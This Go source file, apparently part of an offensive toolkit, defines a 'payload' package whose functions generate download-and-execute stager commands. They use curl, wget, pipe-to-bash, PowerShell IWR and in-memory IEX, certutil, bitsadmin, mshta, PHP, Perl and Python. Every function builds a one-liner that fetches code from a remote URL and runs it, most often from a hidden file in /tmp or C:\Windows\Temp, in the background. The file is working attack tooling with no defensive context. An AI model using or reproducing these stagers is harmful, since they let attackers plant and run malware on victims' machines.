package payload

import "fmt"

// Curl returns a curl download-and-execute stager.
func Curl(url, filename string) string {
	if filename == "" {
		filename = "/tmp/.p"
	}
	return fmt.Sprintf("curl -so %s %s && chmod +x %s && %s &", filename, url, filename, filename)
}

// Wget returns a wget download-and-execute stager.
func Wget(url, filename string) string {
	if filename == "" {
		filename = "/tmp/.p"
	}
	return fmt.Sprintf("wget -qO %s %s && chmod +x %s && %s &", filename, url, filename, filename)
}

// CurlPipe returns a curl pipe-to-bash stager.
func CurlPipe(url string) string {
	return fmt.Sprintf("curl -s %s | bash", url)
}

// WgetPipe returns a wget pipe-to-bash stager.
func WgetPipe(url string) string {
	return fmt.Sprintf("wget -qO- %s | bash", url)
}

// PowerShellDownload returns a PowerShell download-and-execute stager.
func PowerShellDownload(url, filename string) string {
	if filename == "" {
		filename = `C:\Windows\Temp\p.exe`
	}
	return fmt.Sprintf(
		`powershell -nop -c "IWR '%s' -OutFile '%s'; Start-Process '%s'"`,
		url, filename, filename,
	)
}

// PowerShellIEX returns a PowerShell in-memory execution stager.
func PowerShellIEX(url string) string {
	return fmt.Sprintf(`powershell -nop -c "IEX(IWR '%s').Content"`, url)
}

// Certutil returns a certutil download-and-execute stager (Windows).
func Certutil(url, filename string) string {
	if filename == "" {
		filename = `C:\Windows\Temp\p.exe`
	}
	return fmt.Sprintf(
		`certutil -urlcache -split -f "%s" "%s" && start /b "" "%s"`,
		url, filename, filename,
	)
}

// Bitsadmin returns a bitsadmin download-and-execute stager (Windows).
func Bitsadmin(url, filename string) string {
	if filename == "" {
		filename = `C:\Windows\Temp\p.exe`
	}
	return fmt.Sprintf(
		`bitsadmin /transfer j /download /priority high "%s" "%s" && start /b "" "%s"`,
		url, filename, filename,
	)
}

// MshtaStager returns an mshta execution stager (Windows, .hta hosting required).
func Mshta(url string) string {
	return fmt.Sprintf(`mshta %s`, url)
}

// PHPDownload returns a PHP download-and-execute stager.
func PHPDownload(url, filename string) string {
	if filename == "" {
		filename = "/tmp/.p"
	}
	return fmt.Sprintf(
		`php -r 'file_put_contents("%s",file_get_contents("%s"));chmod("%s",0755);exec("%s &");'`,
		filename, url, filename, filename,
	)
}

// PerlDownload returns a Perl download-and-execute stager.
func PerlDownload(url, filename string) string {
	if filename == "" {
		filename = "/tmp/.p"
	}
	return fmt.Sprintf(
		`perl -e 'use LWP::Simple;getstore("%s","%s");chmod 0755,"%s";exec("%s &")'`,
		url, filename, filename, filename,
	)
}

// PythonDownload returns a Python download-and-execute stager.
func PythonDownload(url, filename string) string {
	if filename == "" {
		filename = "/tmp/.p"
	}
	return fmt.Sprintf(
		`python3 -c "import urllib.request,os,stat;`+
			`f='%s';urllib.request.urlretrieve('%s',f);`+
			`os.chmod(f,os.stat(f).st_mode|stat.S_IEXEC);os.system(f+' &')"`,
		filename, url,
	)
}
